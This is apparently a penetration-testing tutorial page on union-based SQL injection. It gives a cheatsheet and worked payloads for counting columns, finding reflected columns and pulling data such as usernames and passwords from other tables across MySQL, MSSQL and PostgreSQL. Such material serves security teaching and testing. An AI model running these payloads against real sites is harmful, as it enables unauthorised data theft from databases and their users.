---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# UNION based SQLi

**Union-based SQL Injection is a technique that exploits the `UNION` SQL operator to merge the results of an injected query with the original query.**

This technique is particularly useful when the results of a query you control are reflected back to you in some way, such as in a table on a web page. By injecting a `UNION` statement, attackers can manipulate the displayed data to retrieve information from other tables.

To do this, first determine the number of columns in the original query by incrementing values until the query executes successfully. Then, identify which columns reflect data by injecting different data types. Once a suitable column is found, use it to extract sensitive information, potentially concatenating multiple values into a single output for more efficient data retrieval.

{% hint style="info" %}
#### Additional Resources

More information on [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks).
{% endhint %}

***

## Cheatsheet

| Action                                                                                                                                                                                                                                                                         | Description                                                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------- |
| <p><code>' ORDER BY 1-- -</code><br><code>' ORDER BY 2-- -</code><br><code>' ORDER BY 3-- -</code><br>…</p>                                                                                                                                                                    | <p>Find the number of columns by increasing the value until an error occurs.<br><br></p>          |
| <p><code>' UNION SELECT NULL-- -</code><br><code>' UNION SELECT NULL,NULL-- -</code><br><code>' UNION SELECT NULL,NULL,NULL-- -</code><br>…</p>                                                                                                                                | <p>Identify column count by adding <code>NULL</code> values until the query succeeds.<br><br></p> |
| <p><code>' UNION SELECT 'a',NULL,NULL-- -</code><br><code>' UNION SELECT NULL,'a',NULL-- -</code><br><code>' UNION SELECT NULL,NULL,'a'-- -</code></p>                                                                                                                         | Test columns with different data types to find one that reflects output.                          |
| `' UNION SELECT <column>,NULL,NULL FROM <table>-- -`                                                                                                                                                                                                                           | Extract data from another table using a reflective column.                                        |
| <p>MySQL:<br><code>CONCAT(&#x3C;column-a>,';',&#x3C;column-b>)</code><br><br>MSSQL:<br><code>&#x3C;column-a>+';'+&#x3C;column-b></code><br>or<br><code>&#x3C;column-a> ';' &#x3C;column-b></code><br><br>PostgreSQL:<br><code>&#x3C;column-a>||';'||&#x3C;column-b></code></p> | Merge values into one column using DBMS-specific syntax.                                          |

***

## UNION Clause

The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. Let us try using the `UNION` operator in a sample database.

{% hint style="warning" %}
## Equal Columns

A `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

{% code overflow="wrap" %}
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
{% endcode %}
{% endhint %}

### Basic UNION

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
{% endcode %}

### Uneven UNION

In the below example, the data '2' is used to "balance" the UNION. This is because the 'products' table has more columns than the number of columns the injected query is returning.

{% code overflow="wrap" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
{% endcode %}

{% hint style="warning" %}
## Data Types

When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
{% endhint %}

{% hint style="success" %}
## NULL Type Tip

For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
{% endhint %}

***

## UNION Injection



***

## Injection Location

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection.

It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them.

The injection cannot be placed at the beginning, or its output will not be printed.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:

```sql
' UNION select 1,@@version,3,4-- 
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page.
